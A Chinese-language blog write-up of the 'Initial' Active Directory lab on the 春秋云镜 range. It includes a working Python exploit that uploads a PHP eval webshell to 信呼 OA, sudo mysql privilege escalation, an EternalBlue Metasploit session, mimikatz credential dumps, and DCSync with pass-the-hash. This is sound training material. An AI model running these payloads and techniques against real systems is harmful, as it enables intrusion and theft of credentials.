---
layout: post
title: Initial - 春秋云镜
category: [春秋云镜]
tags: [active directory pentesting]
---

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/07a5d55cba6d979b.png)

靶标介绍：

Initial 是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个 flag，各部分位于不同的机器上。

| 内网地址    | Host or FQDN               | 简要描述                 |
| ----------- | -------------------------- | ------------------------ |
| 172.22.1.15 | ubuntu-web01               | 外网 ThinkPHP 服务       |
| 172.22.1.18 | XIAORANG-OA01.xiaorang.lab | 信呼 OA、phpmyadmin 服务 |
| 172.22.1.21 | XIAORANG-WIN7.xiaorang.lab | 域内 PC 机               |
| 172.22.1.2  | DC01.xiaorang.lab          | DC                       |

## ThinkPHP RCE

看小图标知道使用的是 thinkphp 框架，直接尝试使用 [thinkphp_gui_tools](https://github.com/bewhale/thinkphp_gui_tools) 工具打：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/f7049e17d72dca4c.png)

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/57c55d0ae6aa5c12.png)

## Sudo 提权

`sudo -l` 查看哪些命令可以免密使用 sudo 命令：

```
/var/www/html/ >whoami
www-data

/var/www/html/ >sudo -l
Matching Defaults entries for www-data on ubuntu-web01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu-web01:
    (root) NOPASSWD: /usr/bin/mysql

/var/www/html/ >
```

使用 [mysql 命令进行 sudo 提权](https://gtfobins.github.io/gtfobins/mysql/#sudo)，成功：

```
/var/www/html/ >sudo mysql -e '\! whoami'
root
```

获取交互式 shell：

```
/var/www/html/ >sudo mysql -e '\! /bin/sh'
```

写入 SSH 公钥，方便后续操作：

```
/var/www/html/ >sudo mysql -e '\! echo "ssh-rsa xxx" >> /root/.ssh/authorized_keys'
```

提权成功后，查看 flag：

```
root@ubuntu-web01:~/flag# cat flag01.txt
 ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████
░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██
 ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░
  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██
   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████
  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██
 ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████
░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░

Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.

flag01: flag{60b53231-
```

外网主机 47.92.165.147 的内网 IP：172.22.1.15

## 信呼 OA

```
┌──(root㉿kali)-[~]
└─# proxychains4 -q cme smb 172.22.1.15/24
SMB         172.22.1.2      445    DC01             [*] Windows Server 2016 Datacenter 14393 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:True)
SMB         172.22.1.18     445    XIAORANG-OA01    [*] Windows Server 2012 R2 Datacenter 9600 x64 (name:XIAORANG-OA01) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.1.21     445    XIAORANG-WIN7    [*] Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (name:XIAORANG-WIN7) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
```

弱口令 admin/admin123，信呼 OA 后台文件上传：

```python
import base64
import requests
requests.packages.urllib3.disable_warnings()

session = requests.session()


import base64


# 修改此处 url 以及账号密码即可
url_pre = 'http://172.22.1.18'
username = base64.b64encode('admin'.encode("utf-8")).decode("utf-8")
password = base64.b64encode('admin123'.encode("utf-8")).decode("utf-8")


url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'

data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': f'{username}',
    'adminpass': f'{password}',
    'yanzm': ''
}

files = {
    'file': ('shell.php', '<?php eval($_REQUEST["pass"]);', 'application/octet-stream')
}

r = session.post(url1, data=data1, verify=False)
r = session.post(url2, files=files, verify=False)


try:
    filepath = str(r.json()['filepath'])
    filepath = "/" + filepath.split('.uptemp')[0] + '.php'
    id = r.json()['id']
except requests.exceptions.JSONDecodeError as e:
    print("Error decoding JSON:", e)

url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'

r = session.get(url3, verify=False)
print("webshell_path:", url_pre + filepath)
print("connection_password: pass")
r = session.get(url_pre + filepath + "?pass=system('whoami');", verify=False)
print("command_echo:", r.text)
```

> 详情见 Y4tacker 的文章：[https://blog.csdn.net/solitudi/article/details/118675321](https://blog.csdn.net/solitudi/article/details/118675321)

该主机还存在 phpmyadmin 可以利用：

| 地址                           | 账号 | 密码 |
| ------------------------------ | ---- | ---- |
| http://172.22.1.18/phpMyadmin/ | root | root |

查看 flag：

```
C:/ >type C:\Users\Administrator\flag\flag02.txt
 ___    ___ ___  ________  ________  ________  ________  ________   ________
|\  \  /  /|\  \|\   __  \|\   __  \|\   __  \|\   __  \|\   ___  \|\   ____\
\ \  \/  / | \  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \\ \  \ \  \___|
 \ \    / / \ \  \ \   __  \ \  \\\  \ \   _  _\ \   __  \ \  \\ \  \ \  \  ___
  /     \/   \ \  \ \  \ \  \ \  \\\  \ \  \\  \\ \  \ \  \ \  \\ \  \ \  \|\  \
 /  /\   \    \ \__\ \__\ \__\ \_______\ \__\\ _\\ \__\ \__\ \__\\ \__\ \_______\
/__/ /\ __\    \|__|\|__|\|__|\|_______|\|__|\|__|\|__|\|__|\|__| \|__|\|_______|
|__|/ \|__|


flag02: 2ce3-4813-87d4-

Awesome! ! ! You found the second flag, now you can attack the domain controller.
C:/ >
```

## MS17-010

使用 fscan 扫描内网主机，发现 172.22.1.21 存在 MS17-010 漏洞：

```
root@ubuntu-web01:/# ./fscan_amd64 -h 172.22.1.15/24 -hn 172.22.1.15 -time 10

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
(icmp) Target 172.22.1.18     is alive
(icmp) Target 172.22.1.2      is alive
(icmp) Target 172.22.1.21     is alive
[*] Icmp alive hosts len is: 3
172.22.1.18:135 open
172.22.1.2:135 open
172.22.1.18:80 open
172.22.1.18:3306 open
172.22.1.21:445 open
172.22.1.2:88 open
172.22.1.2:445 open
172.22.1.18:445 open
172.22.1.21:139 open
172.22.1.2:139 open
172.22.1.18:139 open
172.22.1.21:135 open
[*] alive ports len is: 12
start vulscan
[*] NetInfo:
[*]172.22.1.2
   [->]DC01
   [->]172.22.1.2
[*] NetInfo:
[*]172.22.1.18
   [->]XIAORANG-OA01
   [->]172.22.1.18
[+] 172.22.1.21 MS17-010        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)
[*] NetBios: 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600
[*] NetInfo:
[*]172.22.1.21
   [->]XIAORANG-WIN7
   [->]172.22.1.21
[*] NetBios: 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[*] NetBios: 172.22.1.2      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
[*] WebTitle: http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login
[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统
已完成 12/12
[*] 扫描结束,耗时: 6.802319419s
```

利用 ms17010 漏洞获取主机 SYSTEM 权限，且主机在域环境中：

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/bind_tcp_uuid
payload => windows/x64/meterpreter/bind_tcp_uuid
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 172.22.1.21
RHOSTS => 172.22.1.21
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] 172.22.1.21:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 172.22.1.21:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 172.22.1.21:445       - Scanned 1 of 1 hosts (100% complete)
[+] 172.22.1.21:445 - The target is vulnerable.
[*] 172.22.1.21:445 - Connecting to target for exploitation.
[+] 172.22.1.21:445 - Connection established for exploitation.
[+] 172.22.1.21:445 - Target OS selected valid for OS indicated by SMB reply
[*] 172.22.1.21:445 - CORE raw buffer dump (42 bytes)
[*] 172.22.1.21:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 172.22.1.21:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 172.22.1.21:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 172.22.1.21:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 172.22.1.21:445 - Trying exploit with 12 Groom Allocations.
[*] 172.22.1.21:445 - Sending all but last fragment of exploit packet
[*] 172.22.1.21:445 - Starting non-paged pool grooming
[+] 172.22.1.21:445 - Sending SMBv2 buffers
[+] 172.22.1.21:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 172.22.1.21:445 - Sending final SMBv2 buffers.
[*] 172.22.1.21:445 - Sending last fragment of exploit packet!
[*] 172.22.1.21:445 - Receiving response from exploit packet
[+] 172.22.1.21:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 172.22.1.21:445 - Sending egg to corrupted connection.
[*] 172.22.1.21:445 - Triggering free of corrupted buffer.
[*] Started bind TCP handler against 172.22.1.21:4444
[*] Sending stage (200774 bytes) to 172.22.1.21
[*] Meterpreter session 1 opened (127.0.0.1:43412 -> 127.0.0.1:6666) at 2023-01-06 01:59:04 -0500
[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > sysinfo
Computer        : XIAORANG-WIN7
OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : zh_CN
Domain          : XIAORANG
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter >
```

凭证转储：

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b3a838a991ff075a219c8d532d96a94b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username        Domain        NTLM                              SHA1
--------        ------        ----                              ----
XIAORANG-WIN7$  XIAORANG      14940ad655dbef9d5459610a039bb1eb  b920fe82e91b0c6cb46258f00f766b3755d5e0a7
administrator   XIAORANG.LAB  10cf89a850fb1cdbe6bb432b859164c8

wdigest credentials
===================

Username        Domain        Password
--------        ------        --------
(null)          (null)        (null)
XIAORANG-WIN7$  XIAORANG      cc d2 8b 3d 34 ce 15 82 25 f0 1b 33 57 06 72 86 a6 11 ef 23 35 7e 44 db f4 31 10 5a 55 2d f4 4e a7 1a f3 ff 47 71 28 dc b1 09 07 29 75
                              1c 55 72 80 43 67 24 09 f1 28 fd 08 12 07 30 a8 7a c5 62 e1 53 e6 c6 fc c4 30 b9 cc ef 30 2a c6 b8 2b ef 93 de 35 4c 55 5c 95 6a 27 c0
                              5a d4 f0 09 8f e1 b9 94 0f 33 ca 91 43 db 97 cd fb 7b d8 4e 78 87 5c ee c0 e0 5a 17 a5 32 1c 4a 33 ea c2 13 8e 7b 12 e0 db 53 87 60 9f
                              26 50 08 2c 5b 97 41 b1 ef 96 44 7c 9d d4 af 2e ba 9b af 12 d2 e3 d9 be 11 17 1f 67 9c 5d dc 49 6a 9a 79 90 b2 44 3b 8d de 9f 1b 81 3a
                              23 09 04 2f 1b 26 d4 c1 da 8e 6c 4f 55 1c 05 6e 92 c6 97 0d c2 c1 23 d1 4f 16 08 01 63 57 b1 01 a9 03 e3 77 53 36 8f 2c 0c 21 f3 54 e4
                              5f 25 92 56 08 c5 33 5b 85 62 b2 a3 37 10 bd
administrator   XIAORANG.LAB  (null)

kerberos credentials
====================

Username        Domain        Password
--------        ------        --------
(null)          (null)        (null)
administrator   XIAORANG.LAB  (null)
xiaorang-win7$  XIAORANG.LAB  cc d2 8b 3d 34 ce 15 82 25 f0 1b 33 57 06 72 86 a6 11 ef 23 35 7e 44 db f4 31 10 5a 55 2d f4 4e a7 1a f3 ff 47 71 28 dc b1 09 07 29 75
                              1c 55 72 80 43 67 24 09 f1 28 fd 08 12 07 30 a8 7a c5 62 e1 53 e6 c6 fc c4 30 b9 cc ef 30 2a c6 b8 2b ef 93 de 35 4c 55 5c 95 6a 27 c0
                              5a d4 f0 09 8f e1 b9 94 0f 33 ca 91 43 db 97 cd fb 7b d8 4e 78 87 5c ee c0 e0 5a 17 a5 32 1c 4a 33 ea c2 13 8e 7b 12 e0 db 53 87 60 9f
                              26 50 08 2c 5b 97 41 b1 ef 96 44 7c 9d d4 af 2e ba 9b af 12 d2 e3 d9 be 11 17 1f 67 9c 5d dc 49 6a 9a 79 90 b2 44 3b 8d de 9f 1b 81 3a
                              23 09 04 2f 1b 26 d4 c1 da 8e 6c 4f 55 1c 05 6e 92 c6 97 0d c2 c1 23 d1 4f 16 08 01 63 57 b1 01 a9 03 e3 77 53 36 8f 2c 0c 21 f3 54 e4
                              5f 25 92 56 08 c5 33 5b 85 62 b2 a3 37 10 bd
xiaorang-win7$  XIAORANG.LAB  (null)


meterpreter >
```

## DCSync

域环境信息收集：

```
┌──(root㉿kali)-[~]
└─# proxychains4 -q bloodhound-python -u "XIAORANG-WIN7$" --hashes 14940ad655dbef9d5459610a039bb1eb:14940ad655dbef9d5459610a039bb1eb -d xiaorang.lab -c all --dns-tcp -ns 172.22.1.2 --auth-method ntlm --zip
INFO: Found AD domain: xiaorang.lab
INFO: Connecting to LDAP server: dc01.xiaorang.lab
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.xiaorang.lab
INFO: Found 7 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: XIAORANG-WIN7.xiaorang.lab
INFO: Querying computer: XIAORANG-OA01.xiaorang.lab
INFO: Querying computer: DC01.xiaorang.lab
INFO: User administrator is logged in on DC01.xiaorang.lab from 172.22.1.15
WARNING: Could not resolve hostname to SID: 172.22.1.15
INFO: Done in 00M 15S
INFO: Compressing output into 20230718233027_bloodhound.zip
```

计算机 WIN-DC.XIAORANG.LAB 对域 XIAORANG.LAB 具有 DS-Replication-Get-Changes 和 DS-Replication-Get-Changes-All 权限，即可以进行 DCSync 攻击。
![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/efc85a3a33f172fe.png)

使用 DCSync 从域控导出凭据：

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > dcsync_ntlm Administrator
[!] Running as SYSTEM; function will only work if this computer account has replication privileges (e.g. Domain Controller)
[+] Account   : Administrator
[+] NTLM Hash : 10cf89a850fb1cdbe6bb432b859164c8
[+] LM Hash   : 4f02a552ad7eb0cfd5290793186de941
[+] SID       : S-1-5-21-314492864-3856862959-4045974917-500
[+] RID       : 500
meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv"
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC01.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512
502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514
1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512
1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512
1000    DC01$   0e90dfa648cfbe256c6e72982fe2a94d        532480
1103    XIAORANG-WIN7$  18f7da91e6a16e96f8489bddca70071e        4096
1104    XIAORANG-OA01$  57178943d6b2d05ba54ebb6d9b0f42dc        4096

meterpreter >
```

使用域管 hash 进行 pth：

```
           ___   ___
 \\ / /       / /    // | |     //   ) ) //   ) )  // | |     /|    / / //   ) )
  \  /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //
  / /       / /    / ___  |   //   / / / ___ (   / ___  |   // |  / / //  ____
 / /\\     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /
/ /  \\ __/ /___ //     | | ((___/ / //    | | //     | | //   |/ / ((____/ /


flag03: e8f88d0d43d6}

Unbelievable! ! You found the last flag, which means you have full control over the entire domain network.
```

最后组成完整的 flag：

```
flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}
```
